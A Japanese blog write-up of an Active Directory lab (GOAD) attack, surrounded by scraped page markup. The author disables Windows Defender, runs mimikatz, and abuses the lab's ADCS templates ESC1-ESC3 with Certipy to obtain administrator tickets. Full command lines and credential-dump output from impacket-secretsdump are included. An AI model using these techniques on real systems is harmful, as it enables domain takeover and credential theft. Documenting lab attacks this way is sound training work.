khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021::: jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611::: missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec::: drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6::: sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804::: pnightmare:1121:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e::: MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:f05997d79fa50e0346a4d593d8eb1741::: BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:0d8d114e49ff85a35b3c97208d88dcf3::: gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:563b455a419089dfbfa829cab9f2b174::: removemiccomputer$:1120:aad3b435b51404eeaad3b435b51404ee:1e986d18a9b7c9543e2d57944e8656b7::: SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:743ab45cdf64d2f368f501fd348ab3d8::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:7fe27604209f1b09a5e6b65dc787322c276ad68b6f8c4d031330ba1d2cf92e0a Administrator:aes128-cts-hmac-sha1-96:ae2bd7bb7370fab76dbce7574775785d Administrator:des-cbc-md5:c43b5d5e049e5dc4 krbtgt:aes256-cts-hmac-sha1-96:cbaf94c62ef0df4e9aca570d91669ef363202474c280c40a32356d1fe43d2936 krbtgt:aes128-cts-hmac-sha1-96:d3772f8394664311fa4f2aa721604b98 krbtgt:des-cbc-md5:074ae0d549492af7 daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378 daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd essos.local\\viserys.targaryen:aes256-cts-hmac-sha1-96:2b64ffb14425909795d5c1bfecf9ff2a55423bdfbf2b7b33aece337c6f180950 essos.local\\viserys.targaryen:aes128-cts-hmac-sha1-96:d96686a26adc498b3409d97241cc7112 essos.local\\viserys.targaryen:des-cbc-md5:1ab38c86518c2a97 khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4 khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac khal.drogo:des-cbc-md5:b5ec4c1032ef020d jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671 jorah.mormont:des-cbc-md5:b926916289464ffb missandei:aes256-cts-hmac-sha1-96:41d08ceba69dde0e8f7de8936b3e1e48ee94f9635c855f398cd76262478ffe1c missandei:aes128-cts-hmac-sha1-96:0a9a4343b11f3cce3b66a7f6c3d6377a missandei:des-cbc-md5:54ec15a8c8e6f44f drogon:aes256-cts-hmac-sha1-96:2f92317ed2d02a28a05e589095a92a8ec550b5655d45382fc877f9359e1b7fa1 drogon:aes128-cts-hmac-sha1-96:3968ac4efd4792d0acef565ac4158814 drogon:des-cbc-md5:bf1c85a7c8fdf237 sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516 sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8 sql_svc:des-cbc-md5:91d6b0df31b52a3d pnightmare:aes256-cts-hmac-sha1-96:08da34ebff1dd974ef4694a80381ba0b91053db8c1ff3408c49b1ec870a355ae pnightmare:aes128-cts-hmac-sha1-96:1e52001e6c4555756489ac2632ff1920 pnightmare:des-cbc-md5:5ef4f1d368f476ab MEEREEN$:aes256-cts-hmac-sha1-96:c2ba7282441e5fab1d0937a079b8d16fe707635b3dc418eecc1dcfec0b678f7e MEEREEN$:aes128-cts-hmac-sha1-96:61f0538c8597abbd7af90fe4b4734eb8 MEEREEN$:des-cbc-md5:7c15d3bfb06b8302 BRAAVOS$:aes256-cts-hmac-sha1-96:2a38c6d026c43cc520f37c5fa68c99563351418cb96bcf2131bfeb8077c4681c BRAAVOS$:aes128-cts-hmac-sha1-96:7997ad6ca029027905198cdc9b0fb3ed BRAAVOS$:des-cbc-md5:c17a85c823794acb gmsaDragon$:aes256-cts-hmac-sha1-96:b073af95cf4be2fed876f5d301b2db7ac07b60d9973a3877f4c36af32d2901d8 gmsaDragon$:aes128-cts-hmac-sha1-96:92983daf8288a8ae5a75a6d231f0b442 gmsaDragon$:des-cbc-md5:267c20ce62405ed5 removemiccomputer$:aes256-cts-hmac-sha1-96:8f6354675bc4054f4fd28efa73e3d37239a6f8bb38985c2317050e8c4d45c958 removemiccomputer$:aes128-cts-hmac-sha1-96:2b1e79379afb5995ded695e06e042d3f removemiccomputer$:des-cbc-md5:c1e0f47c20e3d307 SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:76c85f04bb423f39eb02246748da52eb85f4883dfa6f75b039fe84c1e632d070 SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:34cc6de4b34d71da64939577e88a41e4 SEVENKINGDOMS$:des-cbc-md5:34dc49029dd96179 [*] Cleaning up... クレデンシャルダンプした 今回はこれで終わり\n","wordCount":"1764","inLanguage":"en","image":"http://localhost:1313/static/famasoon.jpg","datePublished":"2024-10-26T00:00:00Z","dateModified":"2024-10-26T00:00:00Z","author":{"@type":"Person","name":"FAMASoon"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/goad_writeupch3/"},"publisher":{"@type":"Organization","name":"x64.moe","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">GOAD Writeup Ch3</h1><div class=post-meta><span title='2024-10-26 00:00:00 +0000 UTC'>October 26, 2024</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1764 words&nbsp;·&nbsp;FAMASoon&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/GOAD_writeupch3.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h2 id=round-3>Round 3<a hidden class=anchor aria-hidden=true href=#round-3>#</a></h2><p>meereenの認証情報を<code>Administrator/P@ssw0rd!</code> にした。</p><p>meereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。</p><h3 id=theft-1--exporting-certificates-using-the-cryptoapi>THEFT 1 Exporting certificates using the CryptoAPI<a hidden class=anchor aria-hidden=true href=#theft-1--exporting-certificates-using-the-cryptoapi>#</a></h3><p>mimikatz.exeを用いて証明書を窃取する。</p><p>と思ったけどWindows Defenderでmimikatzが検知される。</p><p>khal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\khal.drogo\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents&gt; whoami 
+essos\khal.drogo
+
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents&gt; Set-MpPreference -DisableRealtimeMonitoring $true
+</code></pre><p>これでmimikatz.exeを実行してみる</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\khal.drogo\Documents&gt; ./mimikatz.exe &#34;crypto::certificates /export&#34; &#34;crypto::capi&#34; &#34;crypto::certificates /export&#34; &#34;exit&#34;
+
+  .#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26
+ .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # crypto::certificates /export
+ * System Store  : &#39;CURRENT_USER&#39; (0x00010000)
+ * Store         : &#39;My&#39;
+
+mimikatz(commandline) # crypto::capi
+Local CryptoAPI RSA CSP patched
+Local CryptoAPI DSS CSP patched
+
+mimikatz(commandline) # crypto::certificates /export
+ * System Store  : &#39;CURRENT_USER&#39; (0x00010000)
+ * Store         : &#39;My&#39;
+
+mimikatz(commandline) # exit
+Bye!
+</code></pre><p>何も出てこないし、pfxとか盗めん…。</p><p>仕方がない別のアプローチで攻撃する</p><h3 id=domain-privilege-escalation>Domain Privilege escalation<a hidden class=anchor aria-hidden=true href=#domain-privilege-escalation>#</a></h3><p>適当にESC1-8あたりを試してみる</p><p>ESCが何かはSpectoropsの資料がよくまとまっている</p><p><a href=https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf>https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf</a></p><pre tabindex=0><code>┌──(kali㉿kali)-[~/goad/braavos]
+└─$ certipy-ad find -u &#39;khal.drogo&#39; -p horse -dc-ip 192.168.56.12 -vulnerable -enabled                             
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 38 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 16 enabled certificate templates
+[*] Trying to get CA configuration for &#39;ESSOS-CA&#39; via CSRA
+[*] Got CA configuration for &#39;ESSOS-CA&#39;
+[*] Saved BloodHound data to &#39;20241023161533_Certipy.zip&#39;. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to &#39;20241023161533_Certipy.txt&#39;
+[*] Saved JSON output to &#39;20241023161533_Certipy.json&#39;
+                                                                                                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/goad/braavos]
+└─$ cat 20241023161533_Certipy.txt                                                    
+Certificate Authorities
+  0
+    CA Name                             : ESSOS-CA
+    DNS Name                            : braavos.essos.local
+    Certificate Subject                 : CN=ESSOS-CA, DC=essos, DC=local
+    Certificate Serial Number           : 5120F6B8733E26BC43F390382A65D06B
+    Certificate Validity Start          : 2024-08-11 03:37:50+00:00
+    Certificate Validity End            : 2029-08-11 03:47:49+00:00
+    Web Enrollment                      : Enabled
+    User Specified SAN                  : Enabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : ESSOS.LOCAL\Administrators
+      Access Rights
+        ManageCertificates              : ESSOS.LOCAL\Administrators
+                                          ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Enterprise Admins
+        ManageCa                        : ESSOS.LOCAL\Administrators
+                                          ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Enterprise Admins
+        Enroll                          : ESSOS.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
+      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
+Certificate Templates
+  0
+    Template Name                       : ESC4
+    Display Name                        : ESC4
+    Certificate Authorities             : ESSOS-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireDirectoryPath
+                                          SubjectRequireEmail
+                                          SubjectAltRequireUpn
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+                                          PendAllRequests
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Code Signing
+    Requires Manager Approval           : True
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 1
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ESSOS.LOCAL\Domain Users
+      Object Control Permissions
+        Owner                           : ESSOS.LOCAL\Enterprise Admins
+        Full Control Principals         : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\khal.drogo
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\khal.drogo
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\khal.drogo
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Property Principals       : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\khal.drogo
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC4                              : &#39;ESSOS.LOCAL\\khal.drogo&#39; has dangerous permissions
+  1
+    Template Name                       : ESC3-CRA
+    Display Name                        : ESC3-CRA
+    Certificate Authorities             : ESSOS-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : True
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+    Enrollment Flag                     : AutoEnrollment
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Certificate Request Agent
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ESSOS.LOCAL\Domain Users
+      Object Control Permissions
+        Owner                           : ESSOS.LOCAL\Enterprise Admins
+        Full Control Principals         : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Property Principals       : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC3                              : &#39;ESSOS.LOCAL\\Domain Users&#39; can enroll and template has Certificate Request Agent EKU set
+  2
+    Template Name                       : ESC2
+    Display Name                        : ESC2
+    Certificate Authorities             : ESSOS-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : True
+    Any Purpose                         : True
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+    Enrollment Flag                     : AutoEnrollment
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Any Purpose
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ESSOS.LOCAL\Domain Users
+      Object Control Permissions
+        Owner                           : ESSOS.LOCAL\Enterprise Admins
+        Full Control Principals         : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Property Principals       : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC2                              : &#39;ESSOS.LOCAL\\Domain Users&#39; can enroll and template can be used for any purpose
+      ESC3                              : &#39;ESSOS.LOCAL\\Domain Users&#39; can enroll and template has Certificate Request Agent EKU set
+  3
+    Template Name                       : ESC1
+    Display Name                        : ESC1
+    Certificate Authorities             : ESSOS-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : ESSOS.LOCAL\Domain Users
+      Object Control Permissions
+        Owner                           : ESSOS.LOCAL\Enterprise Admins
+        Full Control Principals         : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Owner Principals          : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+        Write Property Principals       : ESSOS.LOCAL\Domain Admins
+                                          ESSOS.LOCAL\Local System
+                                          ESSOS.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC1                              : &#39;ESSOS.LOCAL\\Domain Users&#39; can enroll, enrollee supplies subject and template allows client authentication
+</code></pre><p>ラボ環境だから当たり前といえば当たり前だがESC1-8で遊べそう。</p><h3 id=esc1>ESC1<a hidden class=anchor aria-hidden=true href=#esc1>#</a></h3><pre tabindex=0><code>┌──(kali㉿kali)-[~/goad/braavos]
+└─$ certipy-ad req -u &#39;khal.drogo@essos.local&#39; -p &#39;horse&#39; -dc-ip 192.168.56.12 -target 192.168.56.23 -ca &#39;ESSOS-CA&#39; -template ESC1 -upn &#39;administrator@essos.local&#39;
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 9
+[*] Got certificate with UPN &#39;administrator@essos.local&#39;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &#39;administrator.pfx&#39;
+                                                                                                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/goad/braavos]
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@essos.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@essos.local&#39;: aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b
+                                                                                                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/goad/braavos]
+└─$ ls
+20241023161533_Certipy.json  20241023161533_Certipy.txt  20241023161533_Certipy.zip  administrator.ccache  administrator.pfx  asreproast.hash  braavos.nmap  missandei.ccache
+</code></pre><p>というわけでadministratorのTGTゲット</p><h3 id=esc-2>ESC 2<a hidden class=anchor aria-hidden=true href=#esc-2>#</a></h3><pre tabindex=0><code>┌──(kali㉿kali)-[~/goad/braavos]
+└─$ certipy-ad req -u &#39;khal.drogo@essos.local&#39; -p &#39;horse&#39; -dc-ip 192.168.56.12 -target 192.168.56.23 -ca &#39;ESSOS-CA&#39; -template ESC2
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN &#39;khal.drogo@essos.local&#39;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &#39;khal.drogo.pfx&#39;
+                                                                                                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/goad/braavos]
+└─$ certipy-ad auth -pfx khal.drogo.pfx -dc-ip 192.168.56.12
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: khal.drogo@essos.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to &#39;khal.drogo.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;khal.drogo&#39;
+[*] Got hash for &#39;khal.drogo@essos.local&#39;: aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021
+</code></pre><p>ESC2もできた</p><h3 id=esc-3>ESC 3<a hidden class=anchor aria-hidden=true href=#esc-3>#</a></h3><pre tabindex=0><code>──(kali㉿kali)-[~/goad/braavos]
+└─$ certipy-ad req -u &#39;khal.drogo@essos.local&#39; -p &#39;horse&#39; -dc-ip 192.168.56.12 -target 192.168.56.23 -ca &#39;ESSOS-CA&#39; -template ESC3-CRA
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 11
+[*] Got certificate with UPN &#39;khal.drogo@essos.local&#39;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &#39;khal.drogo.pfx&#39;
+                                                                                                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/goad/braavos]
+└─$ certipy-ad req -u &#39;khal.drogo@essos.local&#39; -p &#39;horse&#39; -dc-ip 192.168.56.12 -target 192.168.56.23 -ca &#39;ESSOS-CA&#39; -template ESC3 -on-behalf-of &#39;essos\administrator&#39; -pfx khal.drogo.pfx
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 12
+[*] Got certificate with UPN &#39;administrator@essos.local&#39;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &#39;administrator.pfx&#39;
+
+┌──(kali㉿kali)-[~/goad/braavos]
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@essos.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@essos.local&#39;: aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b
+</code></pre><p>はい、またadministratorのTGT取得</p><p>もうadministratorのTGT取得できているので他のESCなんとかは試さない</p><p>あとはadministratorのチケットを使って色々する</p><pre tabindex=0><code>┌──(kali㉿kali)-[~/goad/braavos]
+└─$ export KRB5CCNAME=administrator.ccache
+
+┌──(kali㉿kali)-[~/goad/braavos]
+└─$ impacket-secretsdump -k meereen.essos.local
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x27f348488bf565282d6c09846f0b195a
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ESSOS\MEEREEN$:plain_password_hex:6b9ebce56793e6984d7266005fafa1f19d404568425240aafdf3116c41ff945d128492d874640bd5ab6fe258c5daa085efb6dbc11cdc7d700cc45ddfddbb540acbf581788f0cfe49eb4675b059247a769ea05bff6a0ea5f8af86a5d8ab766556e688ef3be8302fe626616556244d22ae97417048fe9189e84d1193b77e318de5267b06aed27911237586b80a91ffc17312e7e561757eea0fa1b5ebac4c3a8e21252b4e611e7a92da00c94dd307dc86bc4e239b176c063255e46538009d5f5b6e0349504934361304c7e6ef99c50e33bc9c1d55832c996ad416f377ed86c861ac11787a24cbfa8ed3622ab7b49d89b32a
+ESSOS\MEEREEN$:aad3b435b51404eeaad3b435b51404ee:f05997d79fa50e0346a4d593d8eb1741:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x8a316db332fd5d07200bd16c0c178e3cde2ecf31
+dpapi_userkey:0xb1c344e7203277156a6b15782a58e16577349587
+[*] NL$KM 
+ 0000   48 12 38 16 FC 21 D8 4B  13 02 2E EF A9 E1 B3 FF   H.8..!.K........
+ 0010   C8 F3 E1 9B 62 AC A5 2C  F8 3E 07 1B 66 C5 93 AD   ....b..,.&gt;..f...
+ 0020   06 16 32 5D 1D 00 C0 84  9B EF 1F 84 1C B1 E3 F3   ..2]............
+ 0030   41 8A ED 9D 0A 6A 75 6F  EC 7B D9 79 CF 8E 24 D9   A....juo.{.y..$.
+NL$KM:48123816fc21d84b13022eefa9e1b3ffc8f3e19b62aca52cf83e071b66c593ad0616325d1d00c0849bef1f841cb1e3f3418aed9d0a6a756fec7bd979cf8e24d9
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54798535f08dafb2f3ab805bb312961d:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
+essos.local\viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
+jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
+missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
